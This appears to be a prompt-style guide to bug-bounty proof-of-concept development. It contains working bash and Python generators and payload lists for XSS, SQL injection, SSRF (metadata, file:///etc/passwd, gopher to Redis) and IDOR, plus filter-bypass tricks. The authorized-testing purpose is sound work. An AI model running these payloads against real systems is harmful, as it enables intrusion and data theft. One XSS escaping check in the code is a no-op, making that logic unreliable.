# 22 — PoC Development Automation

## Expert Role

You are a vulnerability proof-of-concept development specialist with deep expertise in creating reproducible, safe, and effective demonstrations of security vulnerabilities. You understand the lifecycle of a PoC from initial concept through validation, documentation, and packaging for submission. You master multiple PoC development approaches — from simple curl commands to sophisticated Python exploits, browser-based demonstrations, and video-recorded evidence. You understand the critical balance between demonstrating impact and causing harm. You build PoCs that are deterministic, meaning they produce the same result on each execution given the same conditions. You are proficient in generating PoCs across vulnerability classes — XSS, SSRF, IDOR, SQL injection, authentication bypass, and business logic flaws. You understand submission requirements for major bug bounty platforms including HackerOne, Bugcrowd, and Intigriti. You build automation that transforms raw scan findings into ready-to-submit PoC packages. You maintain strict ethical boundaries, ensuring PoCs never exceed authorized testing scope or cause damage to production systems. You are an expert at packaging PoCs into professional submissions that triagers can understand and validate efficiently.

## Core Concepts

**PoC Anatomy**: A complete proof-of-concept contains six essential components: (1) Prerequisites — what access level is needed, (2) Steps to reproduce — exact sequence of actions, (3) Expected result — what should happen normally, (4) Actual result — what happens with the vulnerability, (5) Evidence — screenshots, HTTP transcripts, command output, (6) Impact statement — what an attacker could achieve. Every PoC must include all six to be considered complete.

**Deterministic PoCs**: A PoC must produce consistent results when executed under the same conditions. Non-deterministic PoCs (those relying on race conditions or timing) require special handling — multiple execution attempts, statistical evidence, and explicit timing documentation. The goal is reproducibility so the triager can verify the finding independently.

**Safety Boundaries**: PoCs must demonstrate impact without causing damage. This means: never execute destructive commands, never modify data without explicit authorization, never exfiltrate real user data (use test accounts), never perform denial-of-service attacks, and always stay within the authorized testing scope. Safe PoCs use harmless payloads like `document.cookie` for XSS rather than malicious redirects.

**Evidence Hierarchy**: Different vulnerability classes require different evidence types. Web vulnerabilities need HTTP request/response transcripts and screenshots. Authentication bypass needs before/after session state comparison. Business logic flaws need step-by-step video walkthroughs. API vulnerabilities need curl commands or Python scripts with full request/response capture.

**Packaging Standards**: Bug bounty platforms have specific submission formats. HackerOne uses Markdown, Bugcrowd uses their VRT-aligned template, Intigriti uses a custom form. Understanding each platform's requirements ensures submissions are not rejected for formatting issues. Include CVSS scoring, affected URLs, and impact statements in the platform's expected format.

**Automation Integration**: PoC development automation connects to the scanning pipeline — when a scanner identifies a finding, the automation generates a draft PoC with pre-filled templates, evidence placeholders, and platform-specific formatting. This reduces the manual work from finding to submission from hours to minutes.

**Video Documentation**: For complex business logic flaws or multi-step attack chains, video evidence is invaluable. Screen recording tools (OBS, Loom, browser extensions) capture the full attack flow. Video PoCs should be narrated, showing each step clearly, with timestamps for key moments.

**Payload Libraries**: Maintain categorized payload libraries organized by vulnerability class. XSS payloads for different contexts (HTML attribute, JavaScript, CSS, URL), SSRF payloads for different protocols (HTTP, file, gopher, dict), SQL injection payloads for different database types. These libraries accelerate PoC development by providing starting points.

## Prerequisites

- Python 3.10+ with `requests`, `httpx`, `argparse`, and `json` libraries
- `curl` available in PATH for command-line PoCs
- `jq` for JSON processing in shell-based PoCs
- Browser with developer tools for web vulnerability PoCs
- Screen recording software for video PoCs (OBS Studio recommended)
- Understanding of HTTP protocol and request construction
- Familiarity with OWASP Top 10 vulnerability classes
- Access to target testing environment within authorized scope
- Burp Suite (Community or Professional) for HTTP proxy and request manipulation
- Text editor with Markdown support for report writing
- `ffuf` or similar fuzzing tool for payload testing
- Basic knowledge of CVSS 3.1 scoring methodology

## Methodology

**Phase 1 — Vulnerability Analysis**: Before developing a PoC, deeply understand the vulnerability. Identify the root cause, the affected component, the prerequisites for exploitation, and the potential impact. Review scanner findings for context — the raw scanner output provides the "what" but manual analysis reveals the "why" and "how."

**Phase 2 — Attack Path Design**: Map out the exact sequence of steps needed to demonstrate the vulnerability. For simple vulnerabilities (reflected XSS), this may be a single HTTP request. For complex chains (SSRF to cloud metadata to credential theft), this requires a multi-step flow chart. Document the attack path before writing any code.

**Phase 3 — Environment Setup**: Prepare a controlled testing environment. Use test accounts with known credentials. Identify safe test data that won't affect real users. Verify that the testing falls within the authorized scope. For production testing, coordinate with the program's rules of engagement.

**Phase 4 — PoC Development**: Build the PoC starting with the simplest possible demonstration, then add complexity if needed. For web vulnerabilities, start with a curl command that reproduces the issue. For authentication issues, develop a script that demonstrates the bypass. For business logic, create a step-by-step procedure.

**Phase 5 — Payload Crafting**: Create payloads that demonstrate impact without causing harm. XSS payloads should use `alert()`, `document.cookie` (in a safe context), or non-destructive DOM manipulation. SSRF payloads should use safe internal endpoints (metadata endpoints are generally acceptable for PoC purposes). SQL injection should use UNION-based or boolean-based detection rather than destructive operations.

**Phase 6 — Evidence Capture**: Capture all evidence needed for the submission. This includes HTTP request/response pairs (use Burp Repeater or curl -v), screenshots of before/after states, terminal output showing command execution results, and video recordings for complex flows. Ensure evidence includes timestamps and request identifiers for correlation.

**Phase 7 — Validation**: Execute the PoC multiple times to ensure determinism. Test with different browsers, different user accounts, and under slightly different conditions. Document any variability and explain why the finding is still valid even if results vary slightly.

**Phase 8 — Documentation**: Write the complete PoC documentation following the platform-specific template. Include all six components (prerequisites, steps, expected/actual results, evidence, impact). Write in clear, professional language that a non-technical triager can understand.

**Phase 9 — Packaging**: Organize all PoC files into a submission-ready package. This typically includes the main PoC script or curl command, evidence files (screenshots, videos), supporting documentation, and any required configuration files. Use clear file naming conventions.

**Phase 10 — Platform Submission**: Format the package for the target platform. Convert Markdown to the platform's format, resize images to platform limits, compress video if needed, and ensure all required fields are populated. Review the submission against the platform's checklist before submitting.

## Tool Arsenal

**curl-Based PoC Generator**

```bash
#!/bin/bash
# Generate curl PoCs from vulnerability descriptions

generate_xss_poc() {
    local url="$1"
    local param="$2"
    local payload="$3"
    
    cat << EOF
# XSS Proof of Concept
# Target: $url
# Parameter: $param
# Payload: $payload

# Step 1: Send crafted request
curl -v -X GET \\
  "${url}?${param}=${payload}" \\
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \\
  2>&1 | grep -E "(< HTTP|< Location|< Set-Cookie|${payload})"

# Step 2: Verify payload in response
curl -s "${url}?${param}=${payload}" | grep -o "${payload}"

# Expected: Payload reflected in response without sanitization
# Impact: Attacker can execute arbitrary JavaScript in victim's browser
EOF
}

generate_sqli_poc() {
    local url="$1"
    local param="$2"
    
    cat << EOF
# SQL Injection Proof of Concept
# Target: $url
# Parameter: $param

# Step 1: Baseline request
echo "=== Baseline Response ==="
curl -s "${url}?${param}=1" | wc -c

# Step 2: Boolean-based test (true condition)
echo "=== Boolean True ==="
curl -s "${url}?${param}=1 AND 1=1" | wc -c

# Step 3: Boolean-based test (false condition)
echo "=== Boolean False ==="
curl -s "${url}?${param}=1 AND 1=2" | wc -c

# Step 4: UNION-based extraction
echo "=== UNION Column Count ==="
curl -s "${url}?${param}=1 UNION SELECT NULL--" -o /dev/null -w "%{http_code}"
# Increment NULL until 200 response: NULL,NULL,NULL...

# Expected: Different response sizes between true/false conditions
# Impact: Attacker can extract database contents
EOF
}

generate_ssrf_poc() {
    local url="$1"
    local param="$2"
    
    cat << EOF
# SSRF Proof of Concept
# Target: $url
# Parameter: $param

# Step 1: Test with external callback
curl -v "${url}?${param}=http://your-collaborator-id.burpcollaborator.net" 2>&1

# Step 2: Test internal access (metadata endpoint)
curl -v "${url}?${param}=http://169.254.169.254/latest/meta-data/" 2>&1

# Step 3: File protocol test
curl -v "${url}?${param}=file:///etc/passwd" 2>&1

# Expected: Server makes request to specified URL, response contains internal data
# Impact: Attacker can access internal services and cloud metadata
EOF
}

generate_idor_poc() {
    local url="$1"
    local param="$2"
    local legitimate_id="$3"
    local unauthorized_id="$4"
    
    cat << EOF
# IDOR Proof of Concept
# Target: $url
# Parameter: $param

# Step 1: Access with legitimate ID (authenticated as User A)
echo "=== Authorized Access ==="
curl -s -b "session=USER_A_SESSION" \\
  "${url}?${param}=${legitimate_id}" | head -20

# Step 2: Access with different user's ID (authenticated as User B)
echo "=== Unauthorized Access ==="
curl -s -b "session=USER_B_SESSION" \\
  "${url}?${param}=${unauthorized_id}" | head -20

# Step 3: Verify data belongs to different user
curl -s -b "session=USER_B_SESSION" \\
  "${url}?${param}=${unauthorized_id}" | grep -i "user_a_email\\|user_a_name"

# Expected: User B can access User A's data by changing the ID parameter
# Impact: Attacker can access any user's data by modifying the ID
EOF
}

echo "Available PoC generators:"
echo "  generate_xss_poc <url> <param> <payload>"
echo "  generate_sqli_poc <url> <param>"
echo "  generate_ssrf_poc <url> <param>"
echo "  generate_idor_poc <url> <param> <legit_id> <unauth_id>"
```

**Python PoC Framework**

```python
#!/usr/bin/env python3
"""PoC development framework for common vulnerability classes."""
import requests
import json
import sys
import time
from dataclasses import dataclass, field
from typing import Optional, Dict, Any
from urllib.parse import urljoin, urlencode

@dataclass
class PoCResult:
    """Standard PoC result container."""
    success: bool
    vulnerability_type: str
    target: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    steps: list = field(default_factory=list)
    impact: str = ""
    severity: str = "info"
    
    def to_dict(self) -> dict:
        return {
            'success': self.success,
            'type': self.vulnerability_type,
            'target': self.target,
            'evidence': self.evidence,
            'steps': self.steps,
            'impact': self.impact,
            'severity': self.severity
        }
    
    def save(self, filename: str):
        with open(filename, 'w') as f:
            json.dump(self.to_dict(), f, indent=2)

class XSSPoC:
    """XSS proof-of-concept generator."""
    
    PAYLOADS = {
        'basic': '<script>alert("XSS")</script>',
        'img': '<img src=x onerror=alert("XSS")>',
        'svg': '<svg onload=alert("XSS")>',
        'event': '" onfocus=alert("XSS") autofocus="',
        'template': '{{constructor.constructor("alert(1)")()}}',
        'javascript_uri': 'javascript:alert("XSS")',
        'encoded_basic': '%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E',
        'double_encoded': '%253Cscript%253Ealert(%2522XSS%2522)%253C%252Fscript%253E'
    }
    
    def __init__(self, target_url: str, parameter: str, method: str = "GET"):
        self.target_url = target_url
        self.parameter = parameter
        self.method = method.upper()
        self.session = requests.Session()
        self.results = []
    
    def test_payload(self, payload: str, context: str = "html") -> PoCResult:
        """Test a single XSS payload."""
        params = {self.parameter: payload}
        
        if self.method == "GET":
            response = self.session.get(self.target_url, params=params)
        else:
            response = self.session.post(self.target_url, data=params)
        
        reflected = payload in response.text
        not_escaped = payload.replace('<', '<').replace('>', '>') not in response.text or payload in response.text
        
        result = PoCResult(
            success=reflected and not_escaped,
            vulnerability_type=f"XSS ({context})",
            target=self.target_url,
            evidence={
                'request_url': response.url,
                'status_code': response.status_code,
                'payload': payload,
                'reflected': reflected,
                'response_snippet': response.text[:500]
            },
            steps=[
                f"1. Send {self.method} request to {self.target_url}",
                f"2. Include payload in {self.parameter} parameter: {payload}",
                f"3. Observe payload reflected in response without sanitization"
            ],
            impact="Attacker can execute arbitrary JavaScript in victim's browser session",
            severity="high"
        )
        
        self.results.append(result)
        return result
    
    def test_all_payloads(self) -> list:
        """Test all standard XSS payloads."""
        for name, payload in self.PAYLOADS.items():
            self.test_payload(payload, context=name)
        return self.results
    
    def generate_curl(self, payload: str) -> str:
        """Generate curl command for a specific payload."""
        encoded_payload = requests.utils.quote(payload)
        return f'''curl -v -X {self.method} \\
  "{self.target_url}?{self.parameter}={encoded_payload}" \\
  -H "User-Agent: Mozilla/5.0" \\
  2>&1 | grep -E "(< HTTP|{payload[:20]})"'''

class SSRFPoC:
    """SSRF proof-of-concept generator."""
    
    INTERNAL_TARGETS = {
        'aws_metadata': 'http://169.254.169.254/latest/meta-data/',
        'gcp_metadata': 'http://metadata.google.internal/computeMetadata/v1/',
        'azure_metadata': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'localhost': 'http://127.0.0.1:80',
        'file_protocol': 'file:///etc/passwd',
        'dict_protocol': 'dict://127.0.0.1:6379/info',
        'gopher_protocol': 'gopher://127.0.0.1:6379/_INFO'
    }
    
    def __init__(self, target_url: str, parameter: str):
        self.target_url = target_url
        self.parameter = parameter
        self.session = requests.Session()
        self.results = []
    
    def test_internal_access(self, internal_url: str, name: str) -> PoCResult:
        """Test SSRF with a specific internal URL."""
        params = {self.parameter: internal_url}
        
        response = self.session.get(self.target_url, params=params)
        
        body_indicators = [
            'ami-id', 'instance-id',  # AWS
            'machine-type', 'project',  # GCP
            'root:x:0:0',  # /etc/passwd
        ]
        
        has_internal_data = any(indicator in response.text for indicator in body_indicators)
        
        result = PoCResult(
            success=has_internal_data,
            vulnerability_type=f"SSRF ({name})",
            target=self.target_url,
            evidence={
                'request_url': response.url,
                'internal_url_tested': internal_url,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'response_snippet': response.text[:500]
            },
            steps=[
                f"1. Send GET request to {self.target_url}",
                f"2. Set {self.parameter} parameter to {internal_url}",
                f"3. Server fetches internal resource and returns it in response"
            ],
            impact="Attacker can access internal services, cloud metadata, and sensitive files",
            severity="critical"
        )
        
        self.results.append(result)
        return result
    
    def test_all_internal_targets(self) -> list:
        """Test all internal target categories."""
        for name, url in self.INTERNAL_TARGETS.items():
            self.test_internal_access(url, name)
        return self.results

class IDORPoC:
    """IDOR proof-of-concept generator."""
    
    def __init__(self, target_url: str, parameter: str, 
                 legitimate_session: str, unauthorized_session: str):
        self.target_url = target_url
        self.parameter = parameter
        self.legitimate_session = legitimate_session
        self.unauthorized_session = unauthorized_session
    
    def test_access(self, legitimate_id: str, unauthorized_id: str) -> PoCResult:
        """Test IDOR between two different user contexts."""
        auth_authorized = requests.get(
            self.target_url,
            params={self.parameter: legitimate_id},
            cookies={'session': self.legitimate_session}
        )
        
        auth_unauthorized = requests.get(
            self.target_url,
            params={self.parameter: unauthorized_id},
            cookies={'session': self.unauthorized_session}
        )
        
        unauth_success = (
            auth_unauthorized.status_code == 200 and
            len(auth_unauthorized.text) > 100 and
            auth_unauthorized.status_code == auth_authorized.status_code
        )
        
        return PoCResult(
            success=unauth_success,
            vulnerability_type="IDOR",
            target=self.target_url,
            evidence={
                'authorized_status': auth_authorized.status_code,
                'authorized_length': len(auth_authorized.text),
                'unauthorized_status': auth_unauthorized.status_code,
                'unauthorized_length': len(auth_unauthorized.text),
                'authorized_response': auth_authorized.text[:200],
                'unauthorized_response': auth_unauthorized.text[:200]
            },
            steps=[
                f"1. Authenticate as User A (legitimate owner of ID {legitimate_id})",
                f"2. Access {self.target_url}?{self.parameter}={legitimate_id} — returns User A's data",
                f"3. Authenticate as User B",
                f"4. Access {self.target_url}?{self.parameter}={unauthorized_id} — returns User A's data",
                f"5. User B can access User A's resources by changing the {self.parameter} parameter"
            ],
            impact="Attacker can access any user's private data by modifying the ID parameter",
            severity="high"
        )

class PoCPackage:
    """Package multiple PoC results into a submission-ready format."""
    
    def __init__(self, finding_title: str, target: str):
        self.finding_title = finding_title
        self.target = target
        self.pocs = []
        self.screenshots = []
        self.videos = []
    
    def add_poc(self, poc_result: PoCResult):
        self.pocs.append(poc_result)
    
    def add_screenshot(self, filepath: str, caption: str = ""):
        self.screenshots.append({'path': filepath, 'caption': caption})
    
    def add_video(self, filepath: str, description: str = ""):
        self.videos.append({'path': filepath, 'description': description})
    
    def generate_hackerone_markdown(self) -> str:
        """Generate HackerOne-formatted submission."""
        severity = max(self.pocs, key=lambda p: 
            {'critical': 4, 'high': 3, 'medium': 2, 'low': 1, 'info': 0}.get(p.severity, 0)
        ).severity if self.pocs else 'info'
        
        md = f"""## Summary

{self.finding_title}

## Vulnerability Detail

**Vulnerability Type:** {self.pocs[0].vulnerability_type if self.pocs else 'Unknown'}
**Severity:** {severity.upper()}
**Target:** {self.target}

## Steps To Reproduce

"""
        if self.pocs:
            for i, step in enumerate(self.pocs[0].steps, 1):
                md += f"{step}\n"
        
        md += f"""
## Supporting Material / References

"""
        for i, poc in enumerate(self.pocs, 1):
            md += f"### PoC {i}\n"
            md += f"```json\n{json.dumps(poc.evidence, indent=2)}\n```\n\n"
        
        md += f"""
## Impact

{self.pocs[0].impact if self.pocs else 'Security impact assessment required'}

## Vulnerability Skill Required

- [ ] None (No special skill required to exploit)
"""
        
        return md
    
    def generate_bugcrowd_submission(self) -> str:
        """Generate Bugcrowd-formatted submission."""
        severity = 'P2'  # Default, should be adjusted
        
        submission = f"""## Title
{self.finding_title}

## Vulnerability Type
"""
        if self.pocs:
            submission += f"{self.pocs[0].vulnerability_type}\n"
        
        submission += f"""
## Severity
{severity}

## Description
{self.pocs[0].impact if self.pocs else 'Assessment required'}

## Steps to Reproduce
"""
        if self.pocs:
            for step in self.pocs[0].steps:
                submission += f"{step}\n"
        
        submission += """
## Impact
An attacker could exploit this vulnerability to gain unauthorized access to sensitive information.

## Supporting Material
"""
        for i, screenshot in enumerate(self.screenshots, 1):
            submission += f"Screenshot {i}: {screenshot['caption']}\n"
        
        return submission
    
    def save_package(self, output_dir: str):
        """Save complete PoC package to directory."""
        import os
        os.makedirs(output_dir, exist_ok=True)
        
        for i, poc in enumerate(self.pocs):
            poc.save(f"{output_dir}/poc_{i+1}.json")
        
        with open(f"{output_dir}/hackerone_submission.md", 'w') as f:
            f.write(self.generate_hackerone_markdown())
        
        with open(f"{output_dir}/bugcrowd_submission.txt", 'w') as f:
            f.write(self.generate_bugcrowd_submission())

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python poc_framework.py <type> <url> <param> [options]")
        print("Types: xss, ssrf, idor")
        sys.exit(1)
    
    poc_type = sys.argv[1]
    target_url = sys.argv[2]
    parameter = sys.argv[3]
    
    if poc_type == 'xss':
        poc = XSSPoC(target_url, parameter)
        results = poc.test_all_payloads()
    elif poc_type == 'ssrf':
        poc = SSRFPoC(target_url, parameter)
        results = poc.test_all_internal_targets()
    else:
        print(f"Unknown PoC type: {poc_type}")
        sys.exit(1)
    
    successful = [r for r in results if r.success]
    print(f"\nResults: {len(successful)}/{len(results)} payloads successful")
    for result in successful:
        print(f"  [+] {result.vulnerability_type}: {result.evidence.get('payload', result.evidence.get('internal_url_tested', 'N/A'))}")
```

**Browser-Based PoC Generator**

```python
#!/usr/bin/env python3
"""Generate browser-based PoCs using Playwright."""
import asyncio
from pathlib import Path

try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

class BrowserPoCGenerator:
    """Generate browser-based PoCs for web vulnerabilities."""
    
    def __init__(self, output_dir: str = "./browser_pocs"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
    
    async def capture_xss_flow(self, url: str, param: str, payload: str) -> dict:
        """Capture XSS exploitation flow with screenshots."""
        if not PLAYWRIGHT_AVAILABLE:
            return {'error': 'Playwright not installed'}
        
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                viewport={'width': 1280, 'height': 720}
            )
            page = await context.new_page()
            
            screenshots = []
            
            # Step 1: Navigate to target
            await page.goto(url)
            await page.screenshot(
                path=str(self.output_dir / "step1_baseline.png")
            )
            screenshots.append("step1_baseline.png")
            
            # Step 2: Inject payload
            poc_url = f"{url}?{param}={payload}"
            await page.goto(poc_url)
            await page.screenshot(
                path=str(self.output_dir / "step2_payload_injected.png")
            )
            screenshots.append("step2_payload_injected.png")
            
            # Step 3: Wait for XSS execution
            try:
                page.on("dialog", lambda dialog: dialog.dismiss())
                await page.wait_for_timeout(2000)
                await page.screenshot(
                    path=str(self.output_dir / "step3_xss_executed.png")
                )
                screenshots.append("step3_xss_executed.png")
            except Exception:
                pass
            
            await browser.close()
        
        return {
            'url': poc_url,
            'payload': payload,
            'screenshots': screenshots,
            'output_dir': str(self.output_dir)
        }
    
    def generate_html_poc(self, url: str, param: str, payload: str) -> str:
        """Generate a self-contained HTML PoC file."""
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - Self-Contained</title>
    <style>
        body {{ font-family: monospace; margin: 20px; }}
        .step {{ background: #f0f0f0; padding: 10px; margin: 10px 0; border-left: 4px solid #007bff; }}
        .step h3 {{ margin: 0 0 5px 0; }}
        button {{ background: #dc3545; color: white; padding: 10px 20px; border: none; cursor: pointer; font-size: 16px; }}
        button:hover {{ background: #c82333; }}
        pre {{ background: #1a1a1a; color: #00ff00; padding: 15px; overflow-x: auto; }}
    </style>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    
    <div class="step">
        <h3>Target URL</h3>
        <pre>{url}</pre>
    </div>
    
    <div class="step">
        <h3>Payload</h3>
        <pre>{payload}</pre>
    </div>
    
    <div class="step">
        <h3>Parameter</h3>
        <pre>{param}</pre>
    </div>
    
    <div class="step">
        <h3>Action</h3>
        <p>Click the button below to open the vulnerable URL in a new tab.</p>
        <button onclick="window.open('{url}?{param}={payload}', '_blank')">
            Execute PoC
        </button>
    </div>
    
    <div class="step">
        <h3>curl Command</h3>
        <pre>curl -v "{url}?{param}={payload}"</pre>
    </div>
    
    <div class="step">
        <h3>Expected Result</h3>
        <p>JavaScript alert dialog should appear, demonstrating XSS execution.</p>
    </div>
</body>
</html>"""
        
        output_file = self.output_dir / "xss_poc.html"
        output_file.write_text(html_content)
        return str(output_file)

class VideoPoCRecorder:
    """Record video PoCs using screen capture."""
    
    def __init__(self, output_dir: str = "./video_pocs"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
    
    def generate_obs_script(self, poc_steps: list, output_name: str) -> str:
        """Generate OBS Studio script for automated recording."""
        script = f"""# OBS Studio PoC Recording Script
# Output: {output_name}
# Total steps: {len(poc_steps)}

import obspython as obs
import time

recording_started = False

def start_recording():
    global recording_started
    obs_frontend = obs.obs_frontend_recording_start
    obs_frontend()
    recording_started = True
    print("Recording started")

def stop_recording():
    global recording_started
    obs_frontend = obs.obs_frontend_recording_stop
    obs_frontend()
    recording_started = False
    print("Recording stopped")

# PoC Steps Documentation:
"""
        for i, step in enumerate(poc_steps, 1):
            script += f"# Step {i}: {step}\n"
        
        script += f"""
# Start recording, then manually execute each step
# Press hotkey to stop when complete
# Output will be saved to: {self.output_dir / output_name}
"""
        
        script_file = self.output_dir / f"obs_script_{output_name}.py"
        script_file.write_text(script)
        return str(script_file)

if __name__ == '__main__':
    generator = BrowserPoCGenerator()
    
    # Generate a sample HTML PoC
    html_file = generator.generate_html_poc(
        url="https://example.com/search",
        param="q",
        payload='<script>alert("XSS")</script>'
    )
    print(f"HTML PoC generated: {html_file}")
```

**PoC Packaging Script**

```python
#!/usr/bin/env python3
"""Package PoCs for bug bounty submission."""
import json
import zipfile
import hashlib
from pathlib import Path
from datetime import datetime
from typing import List, Dict

class PoCPackager:
    """Package multiple PoC artifacts into submission-ready archives."""
    
    def __init__(self, finding_id: str, output_dir: str = "./packages"):
        self.finding_id = finding_id
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.manifest = {
            'finding_id': finding_id,
            'created': datetime.now().isoformat(),
            'files': []
        }
    
    def add_file(self, filepath: str, description: str = ""):
        """Add a file to the package."""
        path = Path(filepath)
        if path.exists():
            file_hash = hashlib.sha256(path.read_bytes()).hexdigest()[:16]
            self.manifest['files'].append({
                'filename': path.name,
                'description': description,
                'hash': file_hash,
                'size': path.stat().st_size
            })
    
    def add_json_poc(self, poc_data: dict, name: str):
        """Add a JSON PoC directly."""
        filename = f"{name}.json"
        filepath = self.output_dir / filename
        with open(filepath, 'w') as f:
            json.dump(poc_data, f, indent=2)
        self.add_file(str(filepath), f"JSON PoC: {name}")
    
    def add_markdown_report(self, content: str, filename: str = "report.md"):
        """Add a Markdown report."""
        filepath = self.output_dir / filename
        filepath.write_text(content)
        self.add_file(str(filepath), "Markdown report")
    
    def add_screenshot(self, filepath: str, caption: str = ""):
        """Add a screenshot with caption."""
        self.add_file(filepath, f"Screenshot: {caption}")
    
    def generate_zip(self) -> str:
        """Generate ZIP archive of the package."""
        zip_name = f"poc_{self.finding_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        zip_path = self.output_dir / zip_name
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for file_info in self.manifest['files']:
                source_path = self.output_dir / file_info['filename']
                if source_path.exists():
                    zf.write(source_path, file_info['filename'])
            
            manifest_json = json.dumps(self.manifest, indent=2)
            zf.writestr('manifest.json', manifest_json)
        
        return str(zip_path)
    
    def generate_submission_checklist(self) -> str:
        """Generate pre-submission checklist."""
        checklist = f"""# PoC Submission Checklist — {self.finding_id}

## Files in Package
"""
        for f in self.manifest['files']:
            checklist += f"- [ ] {f['filename']}: {f['description']}\n"
        
        checklist += """
## Pre-Submission Verification
- [ ] All PoC steps are documented and reproducible
- [ ] Screenshots are clear and show vulnerability impact
- [ ] No sensitive real user data is included
- [ ] No credentials or tokens are exposed
- [ ] Impact statement is clear and accurate
- [ ] Severity rating is justified with CVSS scoring
- [ ] Remediation guidance is provided
- [ ] File sizes are within platform limits
- [ ] All URLs are within authorized scope

## Platform-Specific Requirements
- [ ] HackerOne: Markdown format, no embedded images in Markdown
- [ ] Bugcrowd: VRT category selected, severity justified
- [ ] Intigriti: Follow submission template

## Post-Submission
- [ ] Monitor for triager questions
- [ ] Be ready to provide additional evidence
- [ ] Document any communication for future reference
"""
        return checklist

if __name__ == '__main__':
    packager = PoCPackager("VULN-2024-001")
    
    packager.add_json_poc({
        'type': 'XSS',
        'target': 'https://example.com',
        'payload': '<script>alert("XSS")</script>',
        'parameter': 'q',
        'method': 'GET'
    }, "xss_poc")
    
    packager.add_markdown_report("# XSS in Search Parameter\nReflected XSS found in the search parameter.")
    
    zip_path = packager.generate_zip()
    checklist = packager.generate_submission_checklist()
    
    print(f"Package created: {zip_path}")
    print(checklist)
```

## Case Studies

**Case Study 1 — Reflected XSS to Account Takeover Chain**

A reflected XSS in a user profile page's `name` parameter was discovered during a bug bounty engagement. The initial finding appeared low-risk (self-XSS), but analysis revealed that admin users would view profiles through a dashboard. The PoC was developed to demonstrate the full attack chain: craft a URL with XSS payload, wait for admin to view the profile, steal admin session cookie, and use it to access admin panel. The PoC included a curl command, a browser-based HTML PoC, and a 2-minute video demonstrating the complete flow. The finding was triaged as Critical and paid $5,000.

**Case Study 2 — SSRF via Image URL Fetcher**

An image proxy endpoint accepted user-supplied URLs and fetched them server-side. The initial PoC tested basic SSRF with `http://127.0.0.1`, but the server had IP restrictions. The PoC was iterated through multiple bypass techniques — IPv6 encoding (`[::1]`), decimal IP conversion, DNS rebinding, and URL parsing inconsistencies (`http://127.0.0.1@evil.com`). The final PoC used a DNS rebinding approach that passed the IP validation while still resolving to the internal network. The submission included three PoC variants demonstrating different bypass techniques.

**Case Study 3 — IDOR in Payment Processing API**

An IDOR in a payment processing API allowed any user to view any transaction by modifying the transaction ID parameter. The PoC was developed using Python's requests library, demonstrating access to another user's payment details including partial credit card numbers. The PoC was carefully crafted to use test transaction IDs and never access real user payment data. The submission included the Python script, curl equivalents, and annotated HTTP request/response pairs from Burp Suite.

**Case Study 4 — Business Logic Flaw in Coupon System**

A coupon system applied discounts sequentially, and a logic flaw allowed the same coupon to be applied multiple times by manipulating the order of operations. The PoC required a 5-step process involving adding items to cart, applying coupons in a specific sequence, and observing the final price. The evidence required was a video walkthrough since the vulnerability was in the business logic rather than a single HTTP request. The video PoC clearly showed the price manipulation at each step.

**Case Study 5 — Authentication Bypass via JWT Manipulation**

A JWT-based authentication system used the `alg: none` algorithm, allowing token forgery. The PoC included a Python script that generated a valid-looking JWT with admin privileges by setting the algorithm to `none` and removing the signature. The PoC demonstrated both the token forgery and the subsequent access to admin-only endpoints. The submission included the Python script, the forged JWT token, and HTTP request/response evidence showing authenticated access with the forged token.

## Bypass Techniques

**WAF Bypass for Payload Delivery**: When a WAF blocks standard payloads, use encoding techniques — double URL encoding, Unicode normalization, HTML entity encoding, or mixed case. For XSS: `<ScRiPt>`, `%3Cscript%3E`, `&#60;script&#62;`. For SSRF: IPv6 encoding, URL parsing inconsistencies, DNS rebinding. Document each bypass technique used in the PoC for the triager's reference.

**Rate Limit Bypass in PoC Execution**: When testing rate-limited endpoints, distribute requests over time or use multiple source IPs (within authorized scope). For race condition PoCs, use parallel request libraries (Python's `asyncio`, Burp's Turbo Intruder). Document the timing and parallelism used.

**Content-Type Bypass**: When servers validate Content-Type headers, try sending the same payload with different content types — `application/json`, `multipart/form-data`, `text/plain`, `application/x-www-form-urlencoded`. Some servers process the body differently based on Content-Type.

**Session State Manipulation**: For session-dependent PoCs, capture the complete session lifecycle — initial authentication, session token generation, token usage, and token validation. This provides complete evidence of the vulnerability's exploitability.

## Advanced Techniques

**Automated PoC Generation from Scanner Output**: Build a pipeline that takes Nuclei or other scanner findings as input and automatically generates draft PoCs. The pipeline parses the finding type, extracts affected parameters, selects appropriate payloads from the library, and generates the PoC script. Manual review and refinement follows, but the initial draft saves significant time.

**PoC Chaining**: Combine multiple low/medium severity findings into a high/critical impact chain. Example: open redirect (low) + OAuth misconfiguration (medium) = account takeover (critical). The PoC package includes individual PoCs for each link in the chain plus a combined demonstration.

**Regression PoCs**: After a vulnerability is fixed, maintain the PoC as a regression test. The PoC should fail (vulnerability not present) against the fixed version. This provides evidence that the fix is effective and serves as documentation for the development team.

**Platform-Specific Optimization**: Optimize PoC presentation for each platform. HackerOne favors detailed Markdown with clear code blocks. Bugcrowd prefers structured VRT-aligned submissions. Intigriti values creative video demonstrations. Adapt the same core PoC to platform preferences.

## Detection Indicators

PoC development activities that may trigger security monitoring include: unusual HTTP request patterns during testing, access to cloud metadata endpoints (for SSRF PoCs), execution of JavaScript payloads in browser environments, multiple failed authentication attempts (for auth bypass PoCs), and access to multiple user accounts in quick succession (for IDOR PoCs). Document all testing activities with timestamps to distinguish authorized testing from malicious activity.

## Impact Assessment

**Submission Success Rate**: Well-developed PoCs significantly improve triage success rates. Submissions with complete PoCs have an estimated 85% triage acceptance rate compared to 30% for text-only descriptions.

